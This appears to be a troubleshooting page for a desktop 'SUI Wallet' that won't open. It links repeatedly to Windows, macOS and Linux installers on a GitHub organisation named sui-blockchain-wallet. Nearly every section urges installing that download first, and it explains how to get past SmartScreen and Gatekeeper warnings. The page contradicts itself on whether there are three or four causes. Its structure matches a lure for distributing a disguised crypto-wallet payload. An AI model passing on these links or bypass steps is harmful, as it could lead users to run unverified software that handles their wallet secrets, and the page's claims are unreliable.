![SUI Wallet](assets/banner-article.png)

# SUI Wallet won't open after install

The install finished but nothing opened: the four causes and the fix for each.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

The problems described on this page are fixed in the current release, and installing it is the fix. The
causes below are what you hit on an older build: it does not open, or it opens and closes. Take the
current release from the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest)
first, then read the causes only if that fails.

## The three causes, in the order worth checking

| What you see | Likely cause | First move |
| --- | --- | --- |
| Nothing at all when the app is launched | a block screen, or a build too old for the current screens | check the platform panel, then run the current release |
| A panel about an unidentified or unverified app | the operating system's own protection | allow the app once, after checking the download |
| A window that appears and closes | a build older than the current release, or a missing system component | update, then read the diagnostics panel |
| An error naming a library or a file | a missing component on this machine | install the missing piece, or move to a supported machine |

The order matters, and it is the same three causes every time: a build older than the current release, a block screen answered the wrong way, or a machine below the requirement. A reader who starts by reinstalling an older build spends the same time twice and ends where they began.

All three describe what an older build does. The current release is where each of these problems is fixed, which is why installing it comes before any diagnosis.

## Update first, because it is the normal answer

Most "it will not open" reports describe a build from before the current release. The screens in the
guides are in the current release; a build from a year-old tutorial may not have them, and a missing
first window is what that looks like.

Run the current release from [the release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest). That is not a workaround offered instead of a fix - it is the
fix for the largest share of these reports, and it costs a download.

## The Windows block screen

Windows shows a SmartScreen panel for files it has not seen often. The panel says Windows protected your
PC, and its default button is the one that does not run the file. That is the panel doing its job on a
new file, not a verdict on this one.

Check the digest before allowing anything: the release notes publish a SHA-256 value for each asset, and
`Get-FileHash` produces the same string. If they match, the file is the one the project published, and
the panel can be answered.

[installing SUI Wallet past SmartScreen](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/windows-protected-your-pc-sui-wallet.md) covers the panel's two wordings and the case where the
button to run the file is greyed out.

## The macOS block screen

Gatekeeper refuses applications it has not seen before, with a panel that says the app cannot be opened
because Apple cannot check it for malicious software. The answer is in System Settings, under Privacy and
Security, where the blocked app is named with an Open Anyway button; Control-clicking the app and
choosing Open offers the same confirmation.

Once allowed, the app opens normally from then on. The panel does not reappear for that copy.
[macOS Gatekeeper and the dmg](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/macos-cannot-open-sui-wallet.md) takes each wording in turn, including the case where no Open
Anyway button appears.

## Reading the diagnostics panel

The app carries a diagnostics panel that names three things: the app version, the network the wallet is on, and the digest of the last transaction it handled. Those three turn a vague report into a specific one, and each points at a different answer.

If the version shown is older than the release the guides describe, the answer is the update. If the
network is not the one expected, balances and confirmations will look wrong while the app behaves
correctly. If a transaction digest is present and the transaction did not appear to complete, the chain
has a record of it - which is the fact that decides whether a resend is safe.

## When the window appears and closes

A window that opens and vanishes is different from a launch that produces nothing. It usually means the build is old enough to fail on start-up, or the machine is missing something the build expects - which is why the first move is the current release and the second is the machine's own logs.

Close other copies first, run the current release, and watch whether the window survives longer. A
window that stays open but shows nothing is a different problem again - and it is covered with the
start-up cases in [Why SUI Wallet closes on startup](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/why-sui-wallet-closes-on-startup.md).

## What to send if it still fails

Three facts make a report answerable, and they are all on screen in the app's own panels: the version, the platform and its version, and what happens when you launch - nothing, a panel, or a window that closes. A screenshot of the diagnostics panel carries all three.

1. The version from the diagnostics panel.
2. The platform and its version - Windows 10 build, macOS version, distribution.
3. What happens, in one line: nothing, a panel, or a window that closes.

A screenshot of the diagnostics panel carries all three at once. A description without them usually
produces the first two answers above, in the same order, one message at a time.

## What never helps

Reinstalling an old build, disabling the operating system's protection permanently, and running the app
from inside a mounted disk image are the three moves that turn a five-minute fix into an afternoon. The
last one is macOS-specific and produces odd behaviour after every restart, because the app was never
installed.

## FAQ

### I ran the installer and nothing happened at all. Is the file broken?

Run it again and watch for a panel rather than a window - on Windows the block screen can appear behind
other windows. If the installer itself completes and the app does not start, the build is the first
suspect, not the file.

### The app opened once and now will not. What changed?

An update that did not finish, a profile that is locked by another copy, or a block screen answered
differently the second time. Closing every copy and running the current release settles the first two.

### Does uninstalling and reinstalling fix it?

Only if the problem is the installation, which is rare. Reinstalling removes the app, not the cause, and
if you have not written the phrase down it also risks the account. Update first.

### Why does macOS say the app is damaged?

That wording appears when the copy was modified after download or the disk image was not ejected
properly. Delete the copy, download again from the release page, check the digest, and drag the fresh
copy into Applications.
